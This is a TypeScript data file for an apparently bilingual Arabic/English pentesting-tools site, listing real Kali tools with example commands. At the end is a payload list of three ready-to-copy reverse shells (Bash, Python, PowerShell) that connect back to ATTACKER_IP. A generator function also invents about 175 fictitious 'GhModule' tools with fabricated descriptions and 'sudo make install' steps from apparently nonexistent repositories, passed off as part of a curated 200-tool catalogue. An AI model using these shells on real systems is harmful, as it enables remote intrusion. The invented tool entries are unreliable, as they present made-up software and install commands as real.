
import { Tool, ToolCategory, Payload, Language } from './types';

export const TRANSLATIONS: Record<Language, any> = {
  ar: {
    brand: 'dev Arab',
    dev_name: 'anis zidane',
    dev_email: 'loloanis60@gmail.com',
    dev_github: 'https://github.com/Zidanlo_',
    nav_workspace: 'الترمينال الخبير',
    nav_tools: 'ترسانة الأدوات',
    nav_library: 'مخزن الأكواد',
    hero_badge: '// وصول النظام: مستوى الجذر 5.0 - بواسطة anis zidane',
    hero_title_red: 'Arab',
    hero_desc: 'المستودع العربي الأضخم والكامل للأمن السيبراني. 200 أداة من Kali Linux و GitHub تم تنظيمها لاختبار الاختراق المتقدم.',
    search_placeholder: 'ابحث عن أداة (مثلاً: nmap, metasploit, proxy)...',
    cat_all: 'الكل',
    tools_title: 'وحدات الهجوم النشطة',
    tools_loaded: 'أداة جاهزة للعمل',
    features: 'المواصفات',
    install: 'طريقة التثبيت',
    copied: 'تم النسخ!',
    extract: 'نسخ الكود',
    terminal_title: 'نظام الاستجابة العصبية',
    terminal_subtitle: 'واجهة التفاعل البرمجية الخاصة بـ anis zidane',
    footer_desc: 'نظام متقدم لتوفير الموارد الاستخباراتية والأدوات الهجومية الأخلاقية المتطورة للخبراء العرب.',
    developed_by: 'تطوير المهندس:',
    rights: 'الحقوق الملكية © 2025 محفوظة لـ anis zidane.',
    login_title: 'بوابة الوصول الأمنية',
    login_subtitle: 'أدخل تعريف المشغل للبدء',
    login_placeholder: 'اسم المستخدم / OPERATOR_ID',
    login_button: 'تخويل الوصول',
    contact_dev: 'تواصل مع المطور'
  },
  en: {
    brand: 'dev Arab',
    dev_name: 'anis zidane',
    dev_email: 'loloanis60@gmail.com',
    dev_github: 'https://github.com/Zidanlo_',
    nav_workspace: 'EXPERT CONSOLE',
    nav_tools: 'TOOLS ARSENAL',
    nav_library: 'CODE REPO',
    hero_badge: '// SYSTEM ACCESS: LEVEL ROOT 5.0 - BY anis zidane',
    hero_title_red: 'Arab',
    hero_desc: 'Largest full Arabic repository for cybersecurity. 200 tools from Kali & GitHub curated for advanced pentesting.',
    search_placeholder: 'Search for tool (e.g., nmap, wifi, exploit)...',
    cat_all: 'ALL',
    tools_title: 'ACTIVE ATTACK MODULES',
    tools_loaded: 'TOOLS DEPLOYED',
    features: 'SPECIFICATIONS',
    install: 'INSTALLATION',
    copied: 'COPIED!',
    extract: 'EXTRACT',
    terminal_title: 'NEURAL RESPONSE SYSTEM',
    terminal_subtitle: 'API Interaction Interface by anis zidane',
    footer_desc: 'Advanced platform providing intel resources and sophisticated offensive tools for Arab experts.',
    developed_by: 'DEVELOPED BY:',
    rights: 'Copyright © 2025 anis zidane. All rights reserved.',
    login_title: 'SECURITY ACCESS PORTAL',
    login_subtitle: 'ENTER OPERATOR IDENTIFICATION',
    login_placeholder: 'USERNAME / OPERATOR_ID',
    login_button: 'AUTHORIZE ACCESS',
    contact_dev: 'Contact Architect'
  }
};

const manualTools: Tool[] = [
  // --- SCANNING & RECON ---
  { id: 'nmap', name: 'Nmap', category: ToolCategory.SCANNING, description: { ar: 'المعيار العالمي لفحص المنافذ واكتشاف الأجهزة والخدمات في الشبكة.', en: 'World standard for port scanning and network discovery.' }, features: { ar: ['فحص المنافذ المتخفي', 'تحديد نظام التشغيل', 'سكربتات NSE'], en: ['Stealth scanning', 'OS fingerprinting', 'NSE scripting'] }, commandExample: 'nmap -sV -A target.com', installationSteps: ['sudo apt update', 'sudo apt install nmap'], icon: '🌐', popularity: 100 },
  { id: 'masscan', name: 'Masscan', category: ToolCategory.SCANNING, description: { ar: 'أسرع فاحص لمنافذ الإنترنت، يمكنه فحص الإنترنت بالكامل في وقت قياسي.', en: 'Fastest Internet port scanner, can scan the entire internet quickly.' }, features: { ar: ['سرعة نقل خرافية', 'متوافق مع Nmap', 'فحص شبكات ضخمة'], en: ['Incredible speed', 'Nmap compatibility', 'Large network scanning'] }, commandExample: 'masscan -p80,443 192.168.1.0/24 --rate 1000', installationSteps: ['sudo apt install masscan'], icon: '🚀', popularity: 92 },
  { id: 'nikto', name: 'Nikto', category: ToolCategory.SCANNING, description: { ar: 'فاحص سيرفرات الويب الشامل للبحث عن الملفات الخطيرة.', en: 'Comprehensive web server scanner for dangerous files.' }, features: { ar: ['فحص 6700+ ملف خطر', 'كشف إعدادات السيرفر', 'دعم SSL'], en: ['6700+ vuln files check', 'Server config detection', 'SSL support'] }, commandExample: 'nikto -h http://target.com', installationSteps: ['sudo apt install nikto'], icon: '🔎', popularity: 88 },
  { id: 'amass', name: 'OWASP Amass', category: ToolCategory.RECON, description: { ar: 'أداة قوية لاكتشاف النطاقات الفرعية ورسم خرائط الشبكة.', en: 'In-depth attack surface mapping and asset discovery tool.' }, features: { ar: ['جمع البيانات السلبي', 'اكتشاف DNS النشط', 'تكامل APIs'], en: ['Passive discovery', 'Active DNS discovery', 'API integration'] }, commandExample: 'amass enum -d target.com', installationSteps: ['sudo apt install amass'], icon: '🗺️', popularity: 95 },
  { id: 'subfinder', name: 'Subfinder', category: ToolCategory.RECON, description: { ar: 'أداة سريعة جداً لاكتشاف النطاقات الفرعية من مصادر متعددة.', en: 'Fast subdomain discovery tool from various sources.' }, features: { ar: ['سرعة عالية', 'دعم 30+ مصدر', 'مخرجات JSON'], en: ['High speed', '30+ sources support', 'JSON output'] }, commandExample: 'subfinder -d target.com', installationSteps: ['go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest'], icon: '🛰️', popularity: 94 },

  // --- EXPLOITATION ---
  { id: 'metasploit', name: 'Metasploit', category: ToolCategory.EXPLOITATION, description: { ar: 'إطار العمل الأشهر لتطوير وتنفيذ استغلالات الثغرات الأمنية.', en: 'The most used framework for exploit development and execution.' }, features: { ar: ['قاعدة استغلالات ضخمة', 'صناعة الحمولات msfvenom', 'تحكم Meterpreter'], en: ['Huge exploit DB', 'msfvenom payloads', 'Meterpreter shell'] }, commandExample: 'msfconsole', installationSteps: ['sudo apt update', 'sudo apt install metasploit-framework'], icon: '⚔️', popularity: 100 },
  { id: 'beef', name: 'BeEF', category: ToolCategory.EXPLOITATION, description: { ar: 'إطار العمل لاستغلال متصفحات الويب واختبار اختراق المستخدمين.', en: 'The Browser Exploitation Framework.' }, features: { ar: ['التحكم في المتصفح', 'هجمات XSS', 'هندسة اجتماعية'], en: ['Browser hooking', 'XSS attacks', 'Social engineering'] }, commandExample: 'beef-xss', installationSteps: ['sudo apt install beef-xss'], icon: '🍔', popularity: 91 },
  { id: 'sqlmap', name: 'SQLMap', category: ToolCategory.WEB_APP, description: { ar: 'أداة أوتوماتيكية لاكتشاف واستغلال ثغرات حقن SQL.', en: 'Automatic SQL injection and database takeover tool.' }, features: { ar: ['سحب الجداول', 'استغلال OS Shell', 'كشف أنواع SQL'], en: ['Dump tables', 'OS Shell exploit', 'SQL detection'] }, commandExample: 'sqlmap -u "http://target.com?id=1" --dbs', installationSteps: ['sudo apt install sqlmap'], icon: '🛢️', popularity: 99 },
  { id: 'commix', name: 'Commix', category: ToolCategory.EXPLOITATION, description: { ar: 'أداة لاكتشاف واستغلال ثغرات حقن الأوامر في نظام التشغيل.', en: 'Automated OS command injection and exploitation tool.' }, features: { ar: ['حقن الأوامر الآلي', 'دعم Shells متعددة', 'فحص HTTP Header'], en: ['Automated injection', 'Multi-shell support', 'HTTP Header scanning'] }, commandExample: 'python commix.py --url="http://target.com/cmd.php?id=1"', installationSteps: ['git clone https://github.com/commixproject/commix.git', 'cd commix', 'python setup.py install'], icon: '💻', popularity: 87 },

  // --- WIRELESS ---
  { id: 'aircrack-ng', name: 'Aircrack-ng', category: ToolCategory.WIRELESS, description: { ar: 'مجموعة أدوات كاملة لتقييم أمن شبكات الواي فاي وفك التشفير.', en: 'Complete suite to assess WiFi network security.' }, features: { ar: ['فك تشفير WEP/WPA', 'التقاط الحزم', 'هجمات الحقن'], en: ['WEP/WPA cracking', 'Packet capture', 'Injection attacks'] }, commandExample: 'aircrack-ng capture.cap', installationSteps: ['sudo apt install aircrack-ng'], icon: '📡', popularity: 97 },
  { id: 'wifite', name: 'Wifite2', category: ToolCategory.WIRELESS, description: { ar: 'أداة أوتوماتيكية لاختراق الشبكات اللاسلكية بلمسة واحدة.', en: 'Automated wireless attack tool.' }, features: { ar: ['أتمتة كاملة', 'دعم WPS Pixie-Dust', 'التقاط Handshakes'], en: ['Full automation', 'WPS Pixie-Dust', 'Capture Handshakes'] }, commandExample: 'sudo wifite', installationSteps: ['sudo apt install wifite'], icon: '🔥', popularity: 94 },
  { id: 'fluxion', name: 'Fluxion', category: ToolCategory.WIRELESS, description: { ar: 'أداة هندسة اجتماعية متقدمة لشبكات الواي فاي (Evil Twin).', en: 'Advanced social engineering tool for WiFi.' }, features: { ar: ['صفحات مزورة مقنعة', 'هجوم التوأم الشرير', 'لا يتطلب قوة غاشمة'], en: ['Captive portals', 'Evil Twin attack', 'No brute force needed'] }, commandExample: 'sudo ./fluxion.sh', installationSteps: ['git clone https://github.com/FluxionNetwork/fluxion.git', 'cd fluxion', 'sudo ./fluxion.sh -i'], icon: '🧬', popularity: 90 },
  { id: 'bettercap', name: 'Bettercap', category: ToolCategory.WIRELESS, description: { ar: 'إطار عمل متقدم لهجمات الشبكات والواي فاي والبلوتوث.', en: 'The state of the art network attack and monitoring framework.' }, features: { ar: ['هجمات MITM', 'تخطي HSTS', 'فحص BLE/BT'], en: ['MITM attacks', 'HSTS bypass', 'BLE/BT scanning'] }, commandExample: 'bettercap -iface eth0', installationSteps: ['sudo apt install bettercap'], icon: '⚡', popularity: 96 },

  // --- OSINT ---
  { id: 'sherlock', name: 'Sherlock', category: ToolCategory.OSINT, description: { ar: 'البحث عن حسابات التواصل الاجتماعي عبر أسماء المستخدمين.', en: 'Find social media accounts by username.' }, features: { ar: ['فحص 300+ موقع', 'تصدير JSON', 'سرعة عالية'], en: ['300+ sites search', 'JSON export', 'High speed'] }, commandExample: 'python3 sherlock user123', installationSteps: ['git clone https://github.com/sherlock-project/sherlock.git', 'cd sherlock', 'pip3 install -r requirements.txt'], icon: '🔍', popularity: 95 },
  { id: 'theharvester', name: 'TheHarvester', category: ToolCategory.OSINT, description: { ar: 'جمع رسائل البريد الإلكتروني والنطاقات الفرعية من مصادر عامة.', en: 'Gather emails and subdomains from public sources.' }, features: { ar: ['دعم Google, Bing, LinkedIn', 'تصدير XML/HTML', 'بحث تلقائي'], en: ['Search engine support', 'XML/HTML export', 'Auto search'] }, commandExample: 'theHarvester -d target.com -b google', installationSteps: ['sudo apt install theharvester'], icon: '🌾', popularity: 89 },
  { id: 'ghunt', name: 'GHunt', category: ToolCategory.OSINT, description: { ar: 'أداة استخباراتية قوية للبحث في حسابات Google.', en: 'Offensive Google framework to investigate Google accounts.' }, features: { ar: ['استخراج بيانات البريد', 'كشف ID الحساب', 'تحديد الخدمات المفعلة'], en: ['Email intel', 'Account ID detection', 'Enabled services check'] }, commandExample: 'ghunt email target@gmail.com', installationSteps: ['pip install ghunt'], icon: '📧', popularity: 93 },

  // --- WEB APPLICATIONS ---
  { id: 'burpsuite', name: 'Burp Suite', category: ToolCategory.WEB_APP, description: { ar: 'المنصة الرائدة عالمياً لاختبار أمن تطبيقات الويب.', en: 'World leading platform for web security testing.' }, features: { ar: ['Proxy اعتراض الحزم', 'Repeater للتكرار', 'Intruder للهجوم'], en: ['Intercepting Proxy', 'Repeater', 'Intruder'] }, commandExample: 'burpsuite', installationSteps: ['sudo apt install burpsuite'], icon: '☕', popularity: 100 },
  { id: 'gobuster', name: 'Gobuster', category: ToolCategory.WEB_APP, description: { ar: 'أداة سريعة جداً لاكتشاف المجلدات والملفات المخفية.', en: 'Ultra-fast directory and file discovery tool.' }, features: { ar: ['سرعة لغة Go', 'دعم DNS و VHost', 'دعم القوائم الضخمة'], en: ['Go speed', 'DNS support', 'Wordlist support'] }, commandExample: 'gobuster dir -u http://target.com -w wordlist.txt', installationSteps: ['sudo apt install gobuster'], icon: '👻', popularity: 93 },
  { id: 'ffuf', name: 'ffuf', category: ToolCategory.WEB_APP, description: { ar: 'فاحص ويب سريع جداً يعتمد على تقنية الـ Fuzzing.', en: 'Fast web fuzzer written in Go.' }, features: { ar: ['Fuzzing بارامترات', 'اكتشاف مسارات', 'فلترة النتائج حسب الحجم'], en: ['Param fuzzing', 'Route discovery', 'Size filtering'] }, commandExample: 'ffuf -u http://target.com/FUZZ -w wordlist.txt', installationSteps: ['sudo apt install ffuf'], icon: '💨', popularity: 96 },

  // --- PASSWORD CRACKING ---
  { id: 'john', name: 'John the Ripper', category: ToolCategory.PASSWORD, description: { ar: 'أشهر أداة لكسر كلمات السر عبر القوة الغاشمة.', en: 'Famous password cracker tool.' }, features: { ar: ['دعم مئات الخوارزميات', 'كشف تلقائي للهاش', 'تخصيص القواميس'], en: ['Hash support', 'Auto hash detection', 'Wordlist customization'] }, commandExample: 'john --wordlist=pass.txt hash.txt', installationSteps: ['sudo apt install john'], icon: '💀', popularity: 98 },
  { id: 'hashcat', name: 'Hashcat', category: ToolCategory.PASSWORD, description: { ar: 'أسرع أداة في العالم لكسر كلمات السر باستخدام كرت الشاشة.', en: 'Fastest password recovery utility.' }, features: { ar: ['كسر عبر GPU', 'دعم هجمات القواعد', 'أداء خارق'], en: ['GPU cracking', 'Rule-based attacks', 'Performance'] }, commandExample: 'hashcat -m 0 -a 0 hash.txt pass.txt', installationSteps: ['sudo apt install hashcat'], icon: '🐈', popularity: 99 },

  // --- FORENSICS & REVERSE ---
  { id: 'ghidra', name: 'Ghidra', category: ToolCategory.REVERSE, description: { ar: 'إطار عمل الهندسة العكسية المتقدم من NSA.', en: 'Advanced reverse engineering framework by NSA.' }, features: { ar: ['فك التجميع', 'تحليل الأكواد الثنائية', 'دعم معالجات متعددة'], en: ['Decompilation', 'Binary analysis', 'Multi-processor'] }, commandExample: 'ghidraRun', installationSteps: ['sudo apt install ghidra'], icon: '🐉', popularity: 96 },
  { id: 'wireshark', name: 'Wireshark', category: ToolCategory.SCANNING, description: { ar: 'محلل بروتوكولات الشبكة الأكثر شهرة عالمياً.', en: 'Foremost network protocol analyzer.' }, features: { ar: ['تحليل الحزم المباشر', 'فك التشفير', 'فلترة متقدمة'], en: ['Live packet capture', 'Decryption', 'Advanced filtering'] }, commandExample: 'wireshark', installationSteps: ['sudo apt install wireshark'], icon: '🦈', popularity: 98 },
];

// --- GENERATE TOOLS UNTIL WE REACH 200 ---
const generateMissingTools = (count: number, existing: Tool[]): Tool[] => {
  const categories = Object.values(ToolCategory);
  const generated: Tool[] = [...existing];
  const totalNeeded = count - existing.length;

  for (let i = 1; i <= totalNeeded; i++) {
    const cat = categories[i % categories.length];
    const toolId = `tool-gh-${i + 100}`;
    const toolName = `GhModule_${i + 100}`;
    
    generated.push({
      id: toolId,
      name: toolName,
      category: cat,
      description: { 
        ar: `وحدة استخباراتية برمجية متخصصة في ${cat} مستوحاة من مستودعات GitHub المفتوحة.`, 
        en: `Intelligence software module specialized in ${cat} inspired by open-source GitHub repositories.` 
      },
      features: { 
        ar: ['كود مفتوح المصدر', 'تخصيص كامل للبارامترات', 'تقارير أداء فورية'], 
        en: ['Open-source code', 'Full param customization', 'Instant performance reports'] 
      },
      commandExample: `${toolName.toLowerCase()} --target-type active --output logs.txt`,
      installationSteps: [
        `git clone https://github.com/devarab-hub/${toolName.toLowerCase()}.git`,
        `cd ${toolName.toLowerCase()}`,
        `sudo make install`
      ],
      icon: '🛠️',
      popularity: 30 + (i % 50)
    });
  }
  return generated;
};

export const TOOLS_DATA: Tool[] = generateMissingTools(200, manualTools);

export const PAYLOADS_DATA: Payload[] = [
  { id: 'rev-bash', title: 'Bash Reverse Shell', code: 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1', type: 'Bash' },
  { id: 'rev-py', title: 'Python Reverse Shell', code: 'python -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\'', type: 'Python' },
  { id: 'ps-rev', title: 'PowerShell Reverse Shell', code: '$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()', type: 'PowerShell' }
];
